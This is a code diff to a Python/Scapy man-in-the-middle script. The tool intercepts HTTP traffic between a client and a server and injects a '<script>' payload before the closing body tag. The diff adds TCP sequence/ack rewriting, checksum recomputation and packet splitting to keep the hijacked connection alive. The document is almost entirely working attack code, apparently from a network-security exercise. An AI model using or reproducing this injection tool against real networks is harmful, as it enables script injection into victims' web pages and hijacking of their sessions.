@@ -41,7 +41,10 @@ def debug(s):
         print('#{0}'.format(s))
         sys.stdout.flush()
 
-
+def min0(inp):
+    if inp < 0:
+        return 0
+    return inp
 # TODO: returns the mac address for an IP
 def mac(IP):
     arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
@@ -85,7 +88,7 @@ def getMSS(pkt):
     return 536
 
 def newHandlePacket(pkt):
-    global clientIP, serverIP, attackerIP, script
+    global clientIP, serverIP, attackerIP, script, clientMAC, serverMAC
     shouldHandle = pkt[Ether].dst == attackerMAC
     ip_src = pkt[IP].src
     ip_dst = pkt[IP].dst
@@ -104,10 +107,12 @@ def newHandlePacket(pkt):
             clientSequence = pkt[TCP].seq
             sessionMap[ID] = {
                 'SeqDelayOffset': 0,
+                'AckDelayOffset': 0,
                 'MSS': mss, 
                 'Num': MAX_MESSAGES,
                 'SplitPacket': False,
-                'Inserted' : 0
+                'Inserted' : 0,
+                'RepeatSeq': -1,
             }
 
         # Check for finalization sequence
@@ -123,18 +128,32 @@ def newHandlePacket(pkt):
         ackNum = pkt[TCP].ack
         
         if dir_p == DIR_CLIENT_TO_SERVER:
+            print("# Received: Attacker -> Server (original):", pkt[TCP].seq, "(seq)", pkt[TCP].ack, "(ack)", pkt[TCP].sport, "(port)")
             # Something           
             if pkt.haslayer(http.HTTPRequest):
                 # Handle splitPacket 
                 pass
-            pkt[TCP].ack = ackNum - sessionMap[ID]['Inserted']
-            pkt[TCP].seq = seqNum - sessionMap[ID]['SeqDelayOffset']
+            if (pkt[TCP].flags & ACK != 0) and sessionMap[ID]['SplitPacket']:
+                if ackNum == sessionMap[ID]['RepeatSeq']:
+                    sessionMap[ID]['SplitPacket'] = False
+                    sessionMap[ID]['RepeatSeq'] = -1
+                    return
+                # Handle two acks and ignore the first one
+                pass
+            pkt[TCP].ack = min0(ackNum - sessionMap[ID]['AckDelayOffset'])
+            sessionMap[ID]['AckDelayOffset'] = sessionMap[ID]['Inserted']
+            print("# Sent: Attacker -> Server (modified):    ", pkt[TCP].seq, "(seq)", pkt[TCP].ack, "(ack)", pkt[TCP].sport, "(port)")
         elif dir_p == DIR_SERVER_TO_CLIENT:
+            print("# Received: Attacker -> Client (original):", pkt[TCP].seq, "(seq)", pkt[TCP].ack, "(ack)", pkt[TCP].dport, "(port)")
+            srcPort = pkt[TCP].sport
+            destPort = pkt[TCP].dport
             # Sonething
             # pkt.show()
             if pkt.haslayer(Raw):
                 textToInsert = f'<script>{script}</script>'
                 body = pkt[Raw].load.decode('utf-8')
+                # print("#Act1 Pkt : ", body)
+                # pkt.show()
                 if pkt.haslayer(http.HTTPResponse):
                     # check for end html, and size of the packet
                     response = pkt.getlayer(http.HTTPResponse)
@@ -147,22 +166,62 @@ def newHandlePacket(pkt):
                         pkt[http.HTTPResponse].Content_Length = newCL
                 if '</body>' in body:
                     sessionMap[ID]['Inserted'] += len(textToInsert)
+                    # print("#Act Pkt : ", body)
                     body = body.split('</body>')
                     newbody =  body[0]+textToInsert+"</body>"+body[1]
-                    if len(newbody) < sessionMap[ID]['MSS']:
-                        pkt[Raw].load = newbody
-                    else:
-                        # Handle MSS 
-                        pass
+                    # print("#HTML Len:", len(pkt[TCP]), sessionMap[ID]['MSS'])
+                    # if len(newbody) < sessionMap[ID]['MSS']:
+                    pkt[Raw].load = newbody
+                    if len(pkt[TCP].payload) > (sessionMap[ID]['MSS']-12):
+                        # pkt.show()
+                        extraLen = len(pkt[TCP].payload) - (sessionMap[ID]['MSS']-12)
+                        # print("#Hi There")
+                        # Handle MSS ????
+                        # we need to divide the packet insome length
+                        # print("# Mod pkt:", newbody)
+                        splitBody1 = newbody[:-extraLen]
+                        splitBody2 = newbody[-extraLen:]
+                        sessionMap[ID]['SplitPacket'] = True
+                        pkt_ID = pkt[IP].id
+                        # firstPkt = pkt
+                        # send the first 
+                        # firstSeq = seqNum
+                        pkt[TCP].seq = seqNum + sessionMap[ID]['SeqDelayOffset']
+                        pkt[Raw].load = splitBody1 
+                        pkt[IP].id = pkt_ID-1
+                        del pkt[IP].len
+                        del pkt[IP].chksum
+                        del pkt[TCP].chksum
+                        print("#First pkt:")
+                        pkt.show()
+
+                        sendp(pkt) #Sent the first part
+                        seqNum = seqNum+len(pkt[TCP].payload)
+                        pkt = IP(src=serverIP, dst=clientIP,id=pkt_ID,flags="DF")/TCP(ack=ackNum, sport=srcPort,dport=destPort, flags="PA")/Raw(load=splitBody2)
+                        # Create a new pkt
+                        print("#Second pkt:")
+                        pkt.show()
+
+                        # pkt[TCP].payload = str.encode(splitBody2)
+                        pkt[TCP].seq = seqNum + sessionMap[ID]['SeqDelayOffset']
+                        sessionMap[ID]['RepeatSeq'] = seqNum + sessionMap[ID]['SeqDelayOffset'] 
+                        sessionMap[ID]['SeqDelayOffset'] = sessionMap[ID]['Inserted']
+                        print("# Sent: Attacker -> Client (modified):    ", pkt[TCP].seq, "(seq)", pkt[TCP].ack, "(ack)", pkt[TCP].dport, "(port)")
+                        send(pkt)
+                        return
+                  
+                        
             pkt[TCP].seq = seqNum + sessionMap[ID]['SeqDelayOffset']
+            sessionMap[ID]['SeqDelayOffset'] = sessionMap[ID]['Inserted']
+            print("# Sent: Attacker -> Client (modified):    ", pkt[TCP].seq, "(seq)", pkt[TCP].ack, "(ack)", pkt[TCP].dport, "(port)")
         
         # Recompute checksums
         del pkt[IP].len
         del pkt[IP].chksum
         del pkt[TCP].chksum
         # pkt = pkt.__class__(bytes(pkt))
+
         sendp(pkt)
-        sessionMap[ID]['SeqDelayOffset'] = sessionMap[ID]['Inserted']
         # pkt.show()
         #print(sessionMap)
 
